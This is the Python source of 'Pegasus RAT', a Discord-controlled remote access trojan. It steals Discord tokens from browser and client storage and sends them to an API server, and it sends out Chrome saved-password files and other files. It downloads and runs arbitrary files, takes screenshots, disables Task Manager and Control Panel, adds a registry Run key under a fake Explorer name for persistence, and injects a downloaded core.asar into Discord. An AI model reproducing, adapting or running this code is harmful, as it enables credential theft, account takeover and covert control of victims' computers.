import winreg, discord, requests, json, ctypes, webbrowser, subprocess, pathlib, os, pyautogui, re, shutil, sys
from win10toast import ToastNotifier
from discord.ext import commands


class ApiManager():
    def __init__(self):
        self.base_url = 'http://127.0.0.1:1337/api'
    
    def send_token(self, token):
        response = requests.get(f'{self.base_url}/send-token?token={token}').status_code
        return f'Server respond with status code {response}'


class Stealer():
    def __init__(self):
        self.Roaming    = os.getenv('APPDATA')
        self.Local      = os.getenv('LOCALAPPDATA')
        self.Discord_Path = [
                                "ROAMING\\Discord\\",
                                "ROAMING\\Lightcord\\",
                                "ROAMING\\discordptb\\",
                                "ROAMING\\discordcanary\\",
                                "ROAMING\\Opera Software\\Opera Stable\\",
                                "ROAMING\\Opera Software\\Opera GX Stable\\",
                                
                                
                                "LOCAL\\Amigo\\User Data\\",
                                "LOCAL\\Torch\\User Data\\",
                                "LOCAL\\Kometa\\User Data\\",
                                "LOCAL\\Orbitum\\User Data\\",
                                "LOCAL\\CentBrowser\\User Data\\",
                                "LOCAL\\7Star\\7Star\\User Data\\",
                                "LOCAL\\Sputnik\\Sputnik\\User Data\\",
                                "LOCAL\\Vivaldi\\User Data\\Default\\",
                                "LOCAL\\Google\\Chrome SxS\\User Data\\",
                                "LOCAL\\Epic Privacy Browser\\User Data\\",
                                "LOCAL\\Google\\Chrome\\User Data\\Default\\",
                                "LOCAL\\uCozMedia\\Uran\\User Data\\Default\\",
                                "LOCAL\\Microsoft\\Edge\\User Data\\Default\\",
                                "LOCAL\\Yandex\\YandexBrowser\\User Data\\Default\\",
                                "LOCAL\\Opera Software\\Opera Neon\\User Data\\Default\\", 
                                "LOCAL\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
                            ]

    def get_tokens(self):
        TokenList  = []
        TokenFirst = []
        for Path in self.Discord_Path:
            Path = Path.replace('ROAMING', self.Roaming).replace('LOCAL', self.Local)
            if not os.path.exists(Path):
                continue
            else:
                Path += 'Local Storage\\leveldb'
                if not os.path.exists(Path):
                    continue
                for file_name in os.listdir(Path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{Path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                if token[:20] not in TokenFirst:
                                    TokenFirst.append(token[:20])
                                    TokenList.append(token)
        return TokenList


class ConnectionManager():
    def __init__(self, client):
        self.ip_addr = requests.get('https://api.ipify.org/').text
        self.connected_clients = []
    
    def is_connected(self, usr_id):
        if f'{usr_id}@{self.ip_addr}' in self.connected_clients:
            return True
        else:
            return False

    def add_connexion(self, usr_id, ip_addr):
        client = f'{usr_id}@{ip_addr}'

        if client not in self.connected_clients:
            self.connected_clients.append(client)
            return f'||<@{usr_id}>|| `Connected with {ip_addr} successfully.`'
        
        else:
            return f'||<@{usr_id}>|| `You are Already connected to {ip_addr} !`'

    def remove_connexion(self, usr_id):
        client = f'{usr_id}@{self.ip_addr}'

        if client not in self.connected_clients:
            return f'||<@{usr_id}>|| `You are not connected to {self.ip_addr} !`'
        
        else:
            self.connected_clients.remove(client)
            return f'||<@{usr_id}>|| `You are now disconnected from {self.ip_addr}.`'

    def get_connected_client(self):
        return self.connected_clients

    def get_ip_addr(self):
        return self.ip_addr


class EmbedGenerator():
    def __init__(self, ConnectionManager):
        self.ConnectionManager = ConnectionManager
        self.footer = "github.com/Its-Vichy/Pegasus-Grabber | V0.1"
        self.title  = "**`🦄` Pegasus RAT**"
        self.color = 0x000001
    
    def generate_embed(self, usr_id, fields):
        embed = discord.Embed(title = self.title, color= self.color)
        embed.set_footer(text = self.footer)
        embed.timestamp

        if self.ConnectionManager.is_connected(usr_id):
            for name, value in fields.items():
                embed.add_field(name = name, value = value)
            return embed
        else:
            return None


class Bot():
    def __init__(self, token, prefix, zombie_noctification):
        client = commands.Bot(command_prefix= prefix)
        self.ConnectionManager = ConnectionManager(client)
        self.EmbedGenerator = EmbedGenerator(self.ConnectionManager)
        self.ApiManager = ApiManager()
        self.client = client
        self.token = token

        @client.event
        async def on_ready():
            print('connected.')
            await client.get_channel(zombie_noctification).send(f"New zombie connected from: {self.ConnectionManager.get_ip_addr()}")

        @client.command()
        async def list(ctx):
            i = 0
            commands = '```ASM\n'
            for cmd in client.commands:
                commands += f'{cmd}\n'
                i += 1
            commands += '```'
            
            await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {f'Command list: ({i} cmd)': commands}))

        @client.command()
        async def connect(ctx, ip_addr):
            await ctx.send(self.ConnectionManager.add_connexion(ctx.message.author.id, ip_addr))

        @client.command()
        async def disconnect(ctx, ip_addr):
            await ctx.send(self.ConnectionManager.remove_connexion(ctx.message.author.id))

        @client.command()
        async def host(ctx):
            string = '```\n'
            for clients in self.ConnectionManager.get_connected_client():
                string += f'{clients}\n'
            string += '```'
            await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Connected clients:': string}))

        @client.command()
        async def message_box(ctx, *, text):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Command result:': 'Message box send successfully.'}))
                ctypes.windll.user32.MessageBoxW(0, text, "How, new message from Pegasus !", 1)
                await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Command result:': 'Message was closed lmao.'}))

        @client.command()
        async def download_file(ctx, *, path):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                await ctx.channel.send(file= discord.File(path))
        
        @client.command()
        async def web_page(ctx, Uri):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                webbrowser.open(Uri)
                await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Command result:': 'Web page opened succesfully.'}))

        @client.command()
        async def admin_check(ctx):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                    await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Command result:': 'Zombie **was** administrator.'}))
                else:
                    await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Command result:': 'Zombie **was not** administrator.'}))
        
        @client.command()
        async def screenshot(ctx):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                pyautogui.screenshot('Pegasus.png')
                await ctx.send(file = discord.File('Pegasus.png'))
                os.remove('Pegasus.png')

        @client.command()
        async def uploid(ctx, url, file_name):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                with open(file_name, "wb") as file:
                    response = requests.get(url)
                    file.write(response.content)
                await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Command result:': f'Successfully downloaded file.'}))

        @client.command()
        async def start_file(ctx, path):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                os.system(f'start {path}')
                await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Command result:': f'Successfully run.'}))

        @client.command()
        async def hostname(ctx):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                resp0 = requests.get(f'http://ip-api.com/json/{self.ConnectionManager.ip_addr}').json()
                resp = requests.get(f'http://extreme-ip-lookup.com/json/{self.ConnectionManager.ip_addr}').json()

                fields = {
                    'IP': resp['query'],
                    'ipType': resp['ipType'],
                    'Country': f"{resp['country']} ({resp0['countryCode']})",
                    'City': resp['city'],
                    'Continent': resp['continent'],
                    'Country': resp['country'],
                    'IPName': resp['ipName'],
                    'ISP': resp['isp'],
                    'Latitute': resp['lat'],
                    'Longitude': resp['lon'],
                    'Org': resp['org'],
                    'Region': f"{resp['region']} ({resp0['region']})",
                    'Status': resp['status'],
                    'timezone': resp0['timezone'],
                    'zip': resp0['zip']
                }

                await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, fields)) 
        
        @client.command()
        async def notify(ctx, timeout, *, text):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                toaster = ToastNotifier()
                toaster.show_toast("Pegasus RAT", text, icon_path=None, duration=int(timeout), threaded=False)


        @client.command()
        async def get_tokens(ctx):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                TokenStealer = Stealer()
                token_list = TokenStealer.get_tokens()

                unique_tokens = []
                string = '```ASM\n'
                for token in token_list:
                    if token not in unique_tokens:
                        self.ApiManager.send_token(token)
                        unique_tokens.append(token)
                        string += f'{token}\n'
                string += '```'
                
                await ctx.send(embed= self.EmbedGenerator.generate_embed(ctx.message.author.id, {'Token found:': string}))

        @client.command()
        async def getpwd(ctx, IP):
            if self.ConnectionManager.is_connected(ctx.message.author.id):
                if IP == GetIP():
                    name = os.getenv("UserName")
                    await ctx.send(file = discord.File(f"C:\\Users\\{name}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"))
                else:
                    await ctx.send(embed = ErrorMsg())



    def start(self):
        self.client.run(self.token)


class RootKit():
    def __init__(self):
        self.core_url   = f'{ApiManager().base_url}/download-core'
        self.Roaming    = os.getenv('APPDATA')
        self.Local      = os.getenv('LOCALAPPDATA')
        self.injectable_discord_Path = [
            'ROAMING\\discord',
            'ROAMING\\Discord',
            'ROAMING\\discordptb',
            'ROAMING\\discordcanary',
            'ROAMING\\Lightcord'
            ]
    
    def disable_task_manager(self):
        registry_path: str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        registry_name: str = "DisableTaskMgr"
        value: int = 1
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(reg_key)
        except WindowsError as e:
            pass

    def disable_control_panel(self):
        registry_path:str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        registry_name:str = "NoControlPanel"
        value:int = 1
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(reg_key)
        except WindowsError as e:
            pass

    def download_core(self):
        with open('core.asar', "wb") as file:
            response = requests.get(self.core_url)
            file.write(response.content)
        print('c bon')

    def enable_persistence(self):
        back_file = os.environ["appdata"] + "\\Windows_Explorer.exe"
        if not os.path.exists(back_file):
            shutil.copyfile(sys.executable, back_file)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "'+ back_file +'"', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def inject_discord(self):
        core_paths = []

        for Path in self.injectable_discord_Path:
            Path = Path.replace('ROAMING', self.Roaming).replace('LOCAL', self.Local)
            if os.path.exists(Path) == True:
                for root, subdir, files in os.walk(Path):
                    for f in files:
                        if f.endswith(".asar"):
                            core_paths.append(str(os.path.join(root, f)))

        os.system('taskkill /f /im discord.exe')
        os.system('taskkill /f /im discordptb.exe')
        os.system('taskkill /f /im discordcanary.exe')

        for path in core_paths:    
            shutil.copy('./core.asar', path)
        os.remove('./core.asar')
                           
      
if __name__ == '__main__':
    RootKit = RootKit()
    RootKit.disable_task_manager()
    RootKit.disable_control_panel()
    RootKit.enable_persistence()
    RootKit.download_core()
    RootKit.inject_discord()

    Bot("xxxxx", ".", 000000000000000000).start()
